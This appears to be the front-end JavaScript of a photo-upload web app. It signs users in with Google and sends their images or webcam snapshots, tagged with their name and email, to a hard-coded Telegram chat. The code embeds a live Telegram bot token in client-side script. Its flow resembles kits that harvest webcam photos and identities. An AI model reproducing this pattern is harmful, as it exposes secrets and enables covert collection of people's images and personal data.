import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";

const firebaseConfig = {
  apiKey: "AIzaSyBLC6enWWKAr3O9ys-4NDjnhch4r1PSw0E",
  authDomain: "picmaster-59602.firebaseapp.com",
  projectId: "picmaster-59602",
  storageBucket: "picmaster-59602.firebasestorage.app",
  messagingSenderId: "434859259854",
  appId: "1:434859259854:web:522979eb1a7f8b6d211d9f"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const provider = new GoogleAuthProvider();

const botToken = "8234454796:AAEF_c5gExxUp7X7pTpu9brOBmjIOTac2uQ";
const chatId = "7752627907";
let currentUser = null;

// UI Panels
const sidePanel = document.getElementById('side-panel');
const settingsBtn = document.getElementById('settings-btn');
const menuToggle = document.getElementById('menu-toggle');

const togglePanel = (e) => { e.stopPropagation(); sidePanel.classList.toggle('active'); };
settingsBtn.onclick = togglePanel;
menuToggle.onclick = togglePanel;
document.onclick = (e) => { if (!sidePanel.contains(e.target)) sidePanel.classList.remove('active'); };

// Telegram Upload Logic
async function uploadToTelegram(file) {
    if (!currentUser) return alert("Please Login First!");
    
    const dropArea = document.getElementById('drop-area');
    const originalText = dropArea.innerHTML;
    dropArea.innerHTML = "<h3>Uploading... 📤</h3>"; // Visual Feedback

    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("document", file, "PICMaster_File.jpg");
    formData.append("caption", `📤 Received from: ${currentUser.displayName}\n📧 ${currentUser.email}`);

    try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
            method: "POST",
            body: formData
        });
        if (response.ok) {
            alert("✅ Sent to Telegram!");
            dropArea.innerHTML = "<h3>Sent Successfully! ✅</h3>";
        } else {
            alert("❌ Telegram Error!");
        }
    } catch (error) {
        alert("❌ Network Error!");
    } finally {
        setTimeout(() => { dropArea.innerHTML = originalText; }, 3000);
    }
}

// --- DROP AREA FIX ---
const dropArea = document.getElementById('drop-area');

// Click panna file select aaga:
dropArea.onclick = () => {
    if(!currentUser) return signInWithPopup(auth, provider);
    const fileInput = document.createElement('input');
    fileInput.type = 'file';
    fileInput.accept = "image/*";
    fileInput.onchange = (e) => {
        const file = e.target.files[0];
        if (file) uploadToTelegram(file);
    };
    fileInput.click();
};

// Drag and Drop panna:
dropArea.addEventListener('dragover', (e) => { e.preventDefault(); dropArea.style.background = "rgba(255,255,255,0.3)"; });
dropArea.addEventListener('dragleave', () => { dropArea.style.background = "rgba(255,255,255,0.15)"; });
dropArea.addEventListener('drop', (e) => {
    e.preventDefault();
    dropArea.style.background = "rgba(255,255,255,0.15)";
    const file = e.dataTransfer.files[0];
    if (file) uploadToTelegram(file);
});

// --- CAMERA FIX ---
document.getElementById('camera-btn').onclick = async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('webcam');
        video.srcObject = stream;
        video.style.display = 'block';
        video.play();

        setTimeout(() => {
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(blob => {
                uploadToTelegram(blob);
                stream.getTracks().forEach(t => t.stop());
                video.style.display = 'none';
            }, 'image/jpeg');
        }, 3000);
    } catch (err) {
        alert("Camera Permission Denied!");
    }
};

// Auth State
onAuthStateChanged(auth, (user) => {
    currentUser = user;
    const mainLogin = document.getElementById('main-login-btn');
    const cameraBtn = document.getElementById('camera-btn');
    const logoutBtn = document.getElementById('logout-btn');
    const userDisp = document.getElementById('user-display');

    if (user) {
        mainLogin.style.display = 'none';
        cameraBtn.style.display = 'block';
        logoutBtn.style.display = 'flex';
        userDisp.innerText = user.displayName;
    } else {
        mainLogin.style.display = 'block';
        cameraBtn.style.display = 'none';
        logoutBtn.style.display = 'none';
        userDisp.innerText = "Guest User";
    }
});

document.getElementById('main-login-btn').onclick = () => signInWithPopup(auth, provider);
document.getElementById('logout-btn').onclick = () => signOut(auth).then(() => location.reload());
